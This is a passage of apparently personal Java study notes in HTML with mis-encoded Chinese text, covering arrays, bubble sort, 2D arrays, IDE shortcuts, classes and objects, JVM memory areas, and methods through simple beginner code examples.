title="æ•°ç»„çš„é»˜è®¤åˆå§‹åŒ–"></a>æ•°ç»„çš„é»˜è®¤åˆå§‹åŒ–</h2><p>æ•°ç»„å£°æ˜ä¹‹åï¼Œæ•°æ®ç±»å‹ä¸åŒï¼Œæ•°ç»„ä¸­å°±ä¼šæœ‰ä¸åŒçš„é»˜è®¤å€¼</p><p>byte 0   short 0    int  0    long 0    double 0.0    float 0.0     char â€˜\u0000â€™     boolean false</p><p>å¼•ç”¨æ•°æ®ç±»å‹é»˜è®¤å€¼éƒ½æ˜¯null String</p><h2 id="æ•°ç»„çš„éå†"><a href="#æ•°ç»„çš„éå†" class="headerlink" title="æ•°ç»„çš„éå†"></a>æ•°ç»„çš„éå†</h2><p>1ã€å€Ÿç”¨forå¾ªç¯</p><pre><code class="java">for(int i = 0;i&lt;(arr.length-1);i++)&#123;            System.out.println(arr[i]);        &#125;</code></pre><p>2ã€</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222004651762.png" alt="image-20220222004651762"></p><p>ä»£ç :</p><pre><code class="java">import java.util.*;class ArrayTest&#123;     public static void main(String [] args)&#123;        int [] arr = &#123;1,2,3,4,5,6,7,8,9&#125;;        for(int i = 0;i&lt;(arr.length-1);i++)&#123;            System.out.println(arr[i]);        &#125;        System.out.println(&quot;----------------------&quot;);        for(int a :arr)&#123;            System.out.println(a);            &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222005429006.png" alt="image-20220222005429006"></p><h2 id="æ•°ç»„çš„å†…å­˜åˆ’åˆ†"><a href="#æ•°ç»„çš„å†…å­˜åˆ’åˆ†" class="headerlink" title="æ•°ç»„çš„å†…å­˜åˆ’åˆ†"></a>æ•°ç»„çš„å†…å­˜åˆ’åˆ†</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221319026.png" alt="image-20220222221319026"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221347039.png" alt="image-20220222221347039"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222221947302.png" alt="image-20220222221947302"></p><h2 id="æ•°ç»„å"><a href="#æ•°ç»„å" class="headerlink" title="æ•°ç»„å"></a>æ•°ç»„å</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222222235753.png" alt="image-20220222222235753"></p><h2 id="æ•°ç»„ç»ƒä¹ "><a href="#æ•°ç»„ç»ƒä¹ " class="headerlink" title="æ•°ç»„ç»ƒä¹ "></a>æ•°ç»„ç»ƒä¹ </h2><h3 id="å­¦ç”Ÿæˆç»©"><a href="#å­¦ç”Ÿæˆç»©" class="headerlink" title="å­¦ç”Ÿæˆç»©"></a>å­¦ç”Ÿæˆç»©</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222222650621.png" alt="image-20220222222650621"></p><pre><code class="java">import java.util.*;class ArrayTest&#123;    public static void main(String [] args)&#123;        int [] arr = new int[5];        Scanner input =new Scanner(System.in);        int scores = 0;        for(int i = 0;i &lt; 5;i++)&#123;            System.out.println(&quot;è¯·è¾“å…¥ç¬¬&quot;+(i+1)+&quot;ä¸ªå­¦ç”Ÿçš„æˆç»©&quot;);            arr[i] = input.nextInt();            scores = scores+arr[i];        &#125;        float ave = scores/5;        System.out.println(&quot;å­¦ç”Ÿçš„æ€»æˆç»©æ˜¯:&quot;+scores);        System.out.println(&quot;å­¦ç”Ÿçš„å¹³å‡æˆç»©ä¸º:&quot;+ave);                for(int i = 0;i &lt; 5;i++)&#123;            System.out.println(&quot;ç¬¬&quot;+(i+1)+&quot;ä¸ªå­¦ç”Ÿçš„æˆç»©æ˜¯&quot;+arr[i]);        &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222224720430.png" alt="image-20220222224720430"></p><h3 id="æ•°ç»„æ‰¾æœ€å€¼"><a href="#æ•°ç»„æ‰¾æœ€å€¼" class="headerlink" title="æ•°ç»„æ‰¾æœ€å€¼"></a>æ•°ç»„æ‰¾æœ€å€¼</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222232917032.png" alt="image-20220222232917032"></p><pre><code class="java">import java.util.*;class ArrayTest&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644&#125;;        int one = arr[0];        for(int i = 1;i &lt; 10;i++)&#123;            if(one &lt; arr[i])&#123;                one = arr[i];            &#125;else&#123;                continue;            &#125;        &#125;        System.out.println(&quot;æ‰¾åˆ°äº†æœ€å¤§çš„é’»çŸ³ï¼Œå®ƒçš„å…‹æ‹‰æ˜¯&quot;+one);    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222232950262.png" alt="image-20220222232950262"></p><h2 id="å†’æ³¡æ’åº"><a href="#å†’æ³¡æ’åº" class="headerlink" title="å†’æ³¡æ’åº"></a>å†’æ³¡æ’åº</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220222233101791.png" alt="image-20220222233101791"></p><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;        System.out.print(&quot;--&gt;&quot;);        int tmp = 0;        for(int j = 0;j&lt; (arr.length-1);j++)&#123;            for(int i = 0;i &lt; (arr.length-1);i++ )&#123;            if(arr[i] &gt; arr[i+1])&#123;                tmp = arr[i];                arr[i] = arr[i+1];                arr[i+1] = tmp;            &#125;else&#123;                continue;            &#125;        &#125;        &#125;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220223002739589.png" alt="image-20220223002739589"></p><p>ä¼˜åŒ–:</p><p>1ã€ä¸“æ³¨äºå¤„ç†æ— åºéƒ¨åˆ†</p><pre><code class="java">for(int j = 0;j&lt; (arr.length-1-i);j++)&#123;</code></pre><p>2ã€è§£å†³æ— æ•ˆæ’åº</p><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;        System.out.print(&quot;--&gt;&quot;);        int tmp = 0;        for(int j = 0;j&lt; (arr.length-1);j++)&#123;            boolean flag = true;            for(int i = 0;i &lt; (arr.length-1);i++ )&#123;            if(arr[i] &gt; arr[i+1])&#123;                tmp = arr[i];                arr[i] = arr[i+1];                arr[i+1] = tmp;                flag = false;            &#125;else&#123;                continue;            &#125;        &#125;        if(flag == true)            break;        &#125;        for(int ele :arr)&#123;            System.out.print(ele+&quot; &quot;);        &#125;    &#125;    &#125;</code></pre><h1 id="day6-æ•°ç»„"><a href="#day6-æ•°ç»„" class="headerlink" title="day6 æ•°ç»„"></a>day6 æ•°ç»„</h1><h2 id="æŸ¥æ‰¾æŒ‡å®šå…ƒç´ çš„ä¸‹æ ‡"><a href="#æŸ¥æ‰¾æŒ‡å®šå…ƒç´ çš„ä¸‹æ ‡" class="headerlink" title="æŸ¥æ‰¾æŒ‡å®šå…ƒç´ çš„ä¸‹æ ‡"></a>æŸ¥æ‰¾æŒ‡å®šå…ƒç´ çš„ä¸‹æ ‡</h2><pre><code class="java">import java.util.*;class MaoPao&#123;    public static void main(String [] args)&#123;        Scanner input = new Scanner(System.in);        System.out.println(&quot;è¯·è¾“å…¥æ‚¨è¦æŸ¥æ‰¾çš„å…ƒç´ :&quot;);        int a = input.nextInt();        int [] arr = &#123;85,958,235,41,-85,69,74,666,854,9644,856,884&#125;;        int index = 0;        for(int i = 0;i&lt;arr.length;i++)&#123;            if(a == arr[i])&#123;                index = i;                break;            &#125;else if(i == (arr.length-1))&#123;                System.out.println(&quot;æŸ¥æ— æ­¤æ•°&quot;);            &#125;        &#125;        System.out.println(&quot;è¯¥å…ƒç´ çš„ä¸‹æ ‡ä¸º&quot;+index);    &#125;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220224233730725.png" alt="image-20220224233730725"></p><h2 id="äºŒç»´æ•°ç»„çš„å£°æ˜"><a href="#äºŒç»´æ•°ç»„çš„å£°æ˜" class="headerlink" title="äºŒç»´æ•°ç»„çš„å£°æ˜"></a>äºŒç»´æ•°ç»„çš„å£°æ˜</h2><p>äºŒç»´æ•°ç»„ï¼šå­˜å‚¨ä¸€ç»´æ•°ç»„çš„æ•°ç»„</p><pre><code class="java">int [][] arr; //æ¨èint arr[][];</code></pre><h2 id="äºŒç»´æ•°ç»„çš„é™æ€åˆå§‹åŒ–"><a href="#äºŒç»´æ•°ç»„çš„é™æ€åˆå§‹åŒ–" class="headerlink" title="äºŒç»´æ•°ç»„çš„é™æ€åˆå§‹åŒ–"></a>äºŒç»´æ•°ç»„çš„é™æ€åˆå§‹åŒ–</h2><pre><code class="java">int [][] arr = &#123;&#123;ä¸€ç»´æ•°ç»„å…ƒç´ &#125;,&#123;ä¸€ç»´æ•°ç»„å…ƒç´ &#125;,&#123;ä¸€ç»´æ•°ç»„å…ƒç´ &#125;&#125;; //æ–¹å¼ä¸€double [][] doubleArr = new double[][]&#123;&#123;ä¸€ç»´æ•°ç»„å…ƒç´ &#125;,&#123;ä¸€ç»´æ•°ç»„å…ƒç´ &#125;,&#123;ä¸€ç»´æ•°ç»„å…ƒç´ &#125;&#125;;//æ–¹å¼äºŒ</code></pre><h2 id="äºŒç»´æ•°ç»„çš„åŠ¨æ€åˆå§‹åŒ–"><a href="#äºŒç»´æ•°ç»„çš„åŠ¨æ€åˆå§‹åŒ–" class="headerlink" title="äºŒç»´æ•°ç»„çš„åŠ¨æ€åˆå§‹åŒ–"></a>äºŒç»´æ•°ç»„çš„åŠ¨æ€åˆå§‹åŒ–</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220224235726620.png" alt="image-20220224235726620"></p><pre><code class="java">int [][] arr = new int[5][5];</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225000442619.png" alt="image-20220225000442619"></p><p>è¿™ç§ä¸€ç»´æ•°ç»„å¯ä»¥ä¸ç­‰é•¿</p><pre><code class="java">double [][] doubleArr = new double[3][];doubleArr[0] = new double[](3.14,6.28);</code></pre><h2 id="äºŒç»´æ•°ç»„çš„éå†"><a href="#äºŒç»´æ•°ç»„çš„éå†" class="headerlink" title="äºŒç»´æ•°ç»„çš„éå†"></a>äºŒç»´æ•°ç»„çš„éå†</h2><h3 id="æ™®é€šforå¾ªç¯"><a href="#æ™®é€šforå¾ªç¯" class="headerlink" title="æ™®é€šforå¾ªç¯"></a>æ™®é€šforå¾ªç¯</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225001512124.png" alt="image-20220225001512124"></p><h3 id="å¢å¼ºforå¾ªç¯"><a href="#å¢å¼ºforå¾ªç¯" class="headerlink" title="å¢å¼ºforå¾ªç¯"></a>å¢å¼ºforå¾ªç¯</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225002726883.png" alt="image-20220225002726883"></p><h2 id="äºŒç»´æ•°ç»„å†…å­˜å›¾"><a href="#äºŒç»´æ•°ç»„å†…å­˜å›¾" class="headerlink" title="äºŒç»´æ•°ç»„å†…å­˜å›¾"></a>äºŒç»´æ•°ç»„å†…å­˜å›¾</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224349397.png" alt="image-20220225224349397"></p><h2 id="äºŒç»´æ•°ç»„ç»ƒä¹ "><a href="#äºŒç»´æ•°ç»„ç»ƒä¹ " class="headerlink" title="äºŒç»´æ•°ç»„ç»ƒä¹ "></a>äºŒç»´æ•°ç»„ç»ƒä¹ </h2><pre><code class="java">122333444455555</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224754924.png" alt="image-20220225224754924"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224829329.png" alt="image-20220225224829329"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225224959416.png" alt="image-20220225224959416"></p><h2 id="ideaçš„ä½¿ç”¨"><a href="#ideaçš„ä½¿ç”¨" class="headerlink" title="ideaçš„ä½¿ç”¨"></a>ideaçš„ä½¿ç”¨</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220225232922084.png" alt="image-20220225232922084"></p><pre><code class="windows">ctrl z æ’¤é”€ctrl y å–æ¶ˆæ’¤é”€</code></pre><p>ideaè‡ªå¸¦å¿«æ·é”®</p><pre><code class="java">ä»¥ä¸‹å†™å‡ºæ¥å+TABpsvm  å†™ä¸€ä¸ªmainæ–¹æ³•        public static void main(String[] args) &#123;            &#125;sout  å¿«é€Ÿè¾“å‡ºè¯­å¥  System.out.println();shift + enter å¿«é€Ÿè·³åˆ°ä¸‹ä¸€è¡ŒCTRL D å¿«é€Ÿåˆ é™¤CTRL ALT ä¸‹  å¿«é€Ÿå¤åˆ¶ALT ä¸Š/ä¸‹ å¿«é€Ÿç§»åŠ¨ä»£ç CTRL SHIFT F æ ¼å¼åŒ–ä»£ç CTRL /  å¿«é€Ÿå•è¡Œæ³¨é‡ŠCTRL shift / å¿«é€Ÿå¤šè¡Œæ³¨é‡Š</code></pre><h1 id="day7-é¢å‘å¯¹è±¡"><a href="#day7-é¢å‘å¯¹è±¡" class="headerlink" title="day7 é¢å‘å¯¹è±¡"></a>day7 é¢å‘å¯¹è±¡</h1><h2 id="é¢å‘å¯¹è±¡æ€æƒ³æ¦‚è¿°"><a href="#é¢å‘å¯¹è±¡æ€æƒ³æ¦‚è¿°" class="headerlink" title="é¢å‘å¯¹è±¡æ€æƒ³æ¦‚è¿°"></a>é¢å‘å¯¹è±¡æ€æƒ³æ¦‚è¿°</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226000438684.png" alt="image-20220226000438684"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226000448451.png" alt="image-20220226000448451"></p><h2 id="ç±»å’Œå¯¹è±¡"><a href="#ç±»å’Œå¯¹è±¡" class="headerlink" title="ç±»å’Œå¯¹è±¡"></a>ç±»å’Œå¯¹è±¡</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001405530.png" alt="image-20220226001405530"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001717468.png" alt="image-20220226001717468"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226001904683.png" alt="image-20220226001904683"></p><h2 id="åˆ›å»ºç±»å’Œå¯¹è±¡"><a href="#åˆ›å»ºç±»å’Œå¯¹è±¡" class="headerlink" title="åˆ›å»ºç±»å’Œå¯¹è±¡"></a>åˆ›å»ºç±»å’Œå¯¹è±¡</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226002820722.png" alt="image-20220226002820722"></p><h3 id="ç±»çš„åˆ›å»º"><a href="#ç±»çš„åˆ›å»º" class="headerlink" title="ç±»çš„åˆ›å»º"></a>ç±»çš„åˆ›å»º</h3><pre><code class="java">[æƒé™ä¿®é¥°ç¬¦] class ç±»å&#123;    &#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226003024771.png" alt="image-20220226003024771"></p><h3 id="å¯¹è±¡çš„åˆ›å»º"><a href="#å¯¹è±¡çš„åˆ›å»º" class="headerlink" title="å¯¹è±¡çš„åˆ›å»º"></a>å¯¹è±¡çš„åˆ›å»º</h3><pre><code class="java">new ç±»å();</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226010357542.png" alt="image-20220226010357542"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226010407353.png" alt="image-20220226010407353"></p><h2 id="åˆ›å»ºå¯¹è±¡å†…å­˜å›¾"><a href="#åˆ›å»ºå¯¹è±¡å†…å­˜å›¾" class="headerlink" title="åˆ›å»ºå¯¹è±¡å†…å­˜å›¾"></a>åˆ›å»ºå¯¹è±¡å†…å­˜å›¾</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226011045893.png" alt="image-20220226011045893"></p><h2 id="åŒ…åç›¸å…³"><a href="#åŒ…åç›¸å…³" class="headerlink" title="åŒ…åç›¸å…³"></a>åŒ…åç›¸å…³</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220226011739538.png" alt="image-20220226011739538"></p><p>åŒ…åä¸€èˆ¬é‡‡ç”¨å…¬å¸ç½‘å€çš„å€’åº</p><p>com.guigu.é¡¹ç›®å</p><p> com.guigu.shopping.login</p><p>java.langä¸éœ€è¦å¯¼åŒ…</p><p>java.sql æ•°æ®åº“ç›¸å…³</p><p>java.io  IOæµç›¸å…³</p><p>java.net ç½‘ç»œç¼–ç¨‹ç›¸å…³</p><p>java.util ä¸€äº›æ ¸å¿ƒçš„å·¥å…·ç±»</p><p>ALT+ENTER å¯ä»¥è‡ªåŠ¨å¯¼åŒ…</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228002520958.png" alt="image-20220228002520958"></p><h2 id="ç¤ºä¾‹å˜é‡å†…å­˜å›¾"><a href="#ç¤ºä¾‹å˜é‡å†…å­˜å›¾" class="headerlink" title="ç¤ºä¾‹å˜é‡å†…å­˜å›¾"></a>ç¤ºä¾‹å˜é‡å†…å­˜å›¾</h2><p>æ ˆï¼šå­˜æ”¾å±€éƒ¨å˜é‡  æ‰§è¡Œæ–¹æ³•ä¹Ÿä¼šå¼€è¾Ÿç©ºé—´  ï¼ˆå­˜å‚¨æ—¶å…ˆè¿›åå‡ºï¼‰</p><p>æœ¬åœ°æ–¹æ³•æ ˆ: å½“æ‰§è¡Œnativeæ–¹æ³•ã€c/c++ å­˜æ”¾å±€éƒ¨å˜é‡ã€æ‰§è¡Œæ–¹æ³•ä¹Ÿä¼šå¼€è¾Ÿç©ºé—´</p><p>æ–¹æ³•åŒº: ç±»çš„ä¿¡æ¯ã€å˜é‡ä¿¡æ¯ã€æ–¹æ³•ä¿¡æ¯ã€å¸¸é‡ä¿¡æ¯  â€¦</p><p>å †ï¼šç”¨æ¥å­˜æ”¾ å¯¹è±¡æ•°ç»„ç­‰ç­‰ newå‡ºæ¥çš„ä¸œè¥¿</p><p>ç¨‹åºè®¡æ•°å™¨ï¼šç”¨äºå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228012112378.png" alt="image-20220228012112378"></p><h2 id="ç±»å˜é‡-é™æ€å˜é‡"><a href="#ç±»å˜é‡-é™æ€å˜é‡" class="headerlink" title="ç±»å˜é‡(é™æ€å˜é‡)"></a>ç±»å˜é‡(é™æ€å˜é‡)</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228160600660.png" alt="image-20220228160600660"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228162715834.png" alt="image-20220228162715834"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228163846163.png" alt="image-20220228163846163"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228164036100.png" alt="image-20220228164036100"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228161831408.png" alt="image-20220228161831408"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228162235053.png" alt="image-20220228162235053"></p><h2 id="æˆå‘˜å˜é‡ç»ƒä¹ "><a href="#æˆå‘˜å˜é‡ç»ƒä¹ " class="headerlink" title="æˆå‘˜å˜é‡ç»ƒä¹ "></a>æˆå‘˜å˜é‡ç»ƒä¹ </h2><h3 id="å£°æ˜ä¸€ä¸ªåœ†çš„å›¾å½¢ç±»"><a href="#å£°æ˜ä¸€ä¸ªåœ†çš„å›¾å½¢ç±»" class="headerlink" title="å£°æ˜ä¸€ä¸ªåœ†çš„å›¾å½¢ç±»"></a>å£°æ˜ä¸€ä¸ªåœ†çš„å›¾å½¢ç±»</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228164929259.png" alt="image-20220228164929259"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170140156.png" alt="image-20220228170140156"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170151620.png" alt="image-20220228170151620"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170202651.png" alt="image-20220228170202651"></p><h3 id="é“¶è¡Œè´¦å·"><a href="#é“¶è¡Œè´¦å·" class="headerlink" title="é“¶è¡Œè´¦å·"></a>é“¶è¡Œè´¦å·</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228170813217.png" alt="image-20220228170813217"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228172650120.png" alt="image-20220228172650120"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228180754684.png" alt="image-20220228180754684"></p><h3 id="ä¸¤ä¸ªç±»"><a href="#ä¸¤ä¸ªç±»" class="headerlink" title="ä¸¤ä¸ªç±»"></a>ä¸¤ä¸ªç±»</h3><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220228181325744.png" alt="image-20220228181325744"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/%5B%5DX%7D@5$I4%256U8%5B%5BX7%7B%25R8I.png" alt="img"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/R$7X6ZT$PCA5@F%EF%BF%BDAIJ28C.png" alt="img"></p><h2 id="æˆå‘˜å˜é‡ç»ƒä¹ å†…å­˜å›¾"><a href="#æˆå‘˜å˜é‡ç»ƒä¹ å†…å­˜å›¾" class="headerlink" title="æˆå‘˜å˜é‡ç»ƒä¹ å†…å­˜å›¾"></a>æˆå‘˜å˜é‡ç»ƒä¹ å†…å­˜å›¾</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301003149544.png" alt="image-20220301003149544"></p><h2 id="æ–¹æ³•çš„åˆè¯†"><a href="#æ–¹æ³•çš„åˆè¯†" class="headerlink" title="æ–¹æ³•çš„åˆè¯†"></a>æ–¹æ³•çš„åˆè¯†</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301003317796.png" alt="image-20220301003317796"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301004501890.png" alt="image-20220301004501890"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301004612778.png" alt="image-20220301004612778"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301005234732.png" alt="image-20220301005234732"></p><h2 id="å½¢å‚å’Œå®å‚"><a href="#å½¢å‚å’Œå®å‚" class="headerlink" title="å½¢å‚å’Œå®å‚"></a>å½¢å‚å’Œå®å‚</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010731517.png" alt="image-20220301010731517"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010415100.png" alt="image-20220301010415100"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301010426651.png" alt="image-20220301010426651"></p><h2 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301011755061.png" alt="image-20220301011755061"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301012111930.png" alt="image-20220301012111930"></p><h2 id="å®ä¾‹æ–¹æ³•"><a href="#å®ä¾‹æ–¹æ³•" class="headerlink" title="å®ä¾‹æ–¹æ³•"></a>å®ä¾‹æ–¹æ³•</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013731242.png" alt="image-20220301013731242"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013553565.png" alt="image-20220301013553565"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301013625258.png" alt="image-20220301013625258"></p><h1 id="day8é¢å‘å¯¹è±¡"><a href="#day8é¢å‘å¯¹è±¡" class="headerlink" title="day8é¢å‘å¯¹è±¡"></a>day8é¢å‘å¯¹è±¡</h1><h2 id="åŸºæœ¬ç±»å‹å€¼ä¼ é€’"><a href="#åŸºæœ¬ç±»å‹å€¼ä¼ é€’" class="headerlink" title="åŸºæœ¬ç±»å‹å€¼ä¼ é€’"></a>åŸºæœ¬ç±»å‹å€¼ä¼ é€’</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301221401587.png" alt="image-20220301221401587"></p><h2 id="å¼•ç”¨æ•°æ®ç±»å‹ä¼ é€’"><a href="#å¼•ç”¨æ•°æ®ç±»å‹ä¼ é€’" class="headerlink" title="å¼•ç”¨æ•°æ®ç±»å‹ä¼ é€’"></a>å¼•ç”¨æ•°æ®ç±»å‹ä¼ é€’</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301222616500.png" alt="image-20220301222616500"></p><h2 id="æ•°ç»„å†…å­˜å›¾"><a href="#æ•°ç»„å†…å­˜å›¾" class="headerlink" title="æ•°ç»„å†…å­˜å›¾"></a>æ•°ç»„å†…å­˜å›¾</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301223516746.png" alt="image-20220301223516746"></p><h2 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a>å±€éƒ¨å˜é‡</h2><p>å®šä¹‰åˆ°æ–¹æ³•ä¸­çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡åªåœ¨æ–¹æ³•ä¸­æœ‰æ•ˆ</p><p>å±€éƒ¨å˜é‡åœ¨ä½¿ç”¨å‰å¿…é¡»å®Œæˆåˆå§‹åŒ–ï¼Œå¦åˆ™æŠ¥é”™</p><p>å®šä¹‰åˆ°ç±»ä¸­çš„å˜é‡æ˜¯æˆå‘˜å˜é‡ï¼Œæˆå‘˜å˜é‡åªåœ¨ç±»ä¸­æœ‰æ•ˆ</p><p>å±€éƒ¨å˜é‡åœ¨æ–¹æ³•è°ƒç”¨åï¼Œæ‰ä¼šè¿›è¡Œåˆå§‹åŒ–ï¼Œå½“æ–¹æ³•æ‰§è¡Œå®Œæ¯•å°±ä¼šéšæ–¹æ³•å¼¹æ ˆæ¶ˆå¤±</p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301225248322.png" alt="image-20220301225248322"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220301225548707.png" alt="image-20220301225548707"></p><h2 id="å¯å˜å½¢å‚"><a href="#å¯å˜å½¢å‚" class="headerlink" 